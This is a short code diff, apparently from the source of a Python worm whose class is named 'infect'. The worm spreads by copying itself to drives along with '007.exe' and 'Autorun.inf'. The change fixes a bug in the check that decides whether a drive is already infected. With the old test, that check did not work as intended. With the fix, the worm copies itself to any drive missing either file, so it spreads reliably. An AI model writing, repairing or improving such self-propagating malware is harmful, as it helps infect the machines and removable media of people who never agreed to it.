@@ -60,7 +60,9 @@ class infect:
             for infectwrite in drives:
                 try:
                     os.chdir(infectwrite)
-                    if '007.exe' and 'Autorun.inf' not in os.listdir(infectwrite):
+                    def infile(fname):
+                        return fname not in os.listdir(infectwrite)
+                    if infile('007.exe') or infile('Autorun.inf'):
                         writeconfig()
                         with open(filename,'rb') as writethis:
                             pages=writethis.read()
